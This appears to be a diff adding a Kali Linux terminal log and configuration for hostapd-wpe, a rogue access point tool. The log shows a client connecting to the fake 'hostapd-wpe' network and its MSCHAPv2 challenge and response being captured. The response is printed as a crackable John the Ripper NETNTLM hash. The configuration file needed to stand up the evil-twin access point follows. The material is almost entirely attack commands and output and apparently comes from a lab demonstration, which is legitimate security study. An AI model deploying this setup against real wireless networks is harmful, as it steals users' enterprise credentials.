@@ -1,0 +1,46 @@
+root@kali:~# hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+Configuration file: /etc/hostapd-wpe/hostapd-wpe.conf
+Using interface wlan0 with hwaddr 00:c0:ca:8f:d9:e6 and ssid "hostapd-wpe"
+wlan0: interface state UNINITIALIZED->ENABLED
+wlan0: AP-ENABLED 
+wlan0: STA 94:65:2d:a4:34:92 IEEE 802.11: associated
+wlan0: CTRL-EVENT-EAP-STARTED 94:65:2d:a4:34:92
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+
+
+mschapv2: Thu May 17 07:04:03 2018
+	 username:	getting_hacked
+	 challenge:	7a:46:19:94:04:65:7c:58
+	 response:	74:2e:95:a4:03:a3:44:26:28:62:44:f1:cb:45:b2:a1:97:e6:d5:9f:f3:70:a1:2c
+	 jtr NETNTLM:	getting_hacked:$NETNTLM$7a46199404657c58$742e95a403a34426286244f1cb45b2a197e6d59ff370a12c
+wlan0: CTRL-EVENT-EAP-FAILURE 94:65:2d:a4:34:92
+wlan0: STA 94:65:2d:a4:34:92 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
+wlan0: STA 94:65:2d:a4:34:92 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
+wlan0: STA 94:65:2d:a4:34:92 IEEE 802.11: disassociated
+wlan0: STA 94:65:2d:a4:34:92 IEEE 802.11: associated
+wlan0: CTRL-EVENT-EAP-STARTED 94:65:2d:a4:34:92
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+
+################################################################################################################
+
+# Configuration file for hostapd-wpe
+ 
+# Interface - Probably wlan0 for 802.11, eth0 for wired
+interface=wlan0
+ 
+# May have to change these depending on build location
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.key
+private_key_passwd=whatever
+dh_file=/etc/hostapd-wpe/certs/dh
+ 
+# 802.11 Options
+ssid=hostapd-wpe
+channel=1
+ 
+ 
+from cat /etc/hostapd-wpe/hostapd-wpe.conf
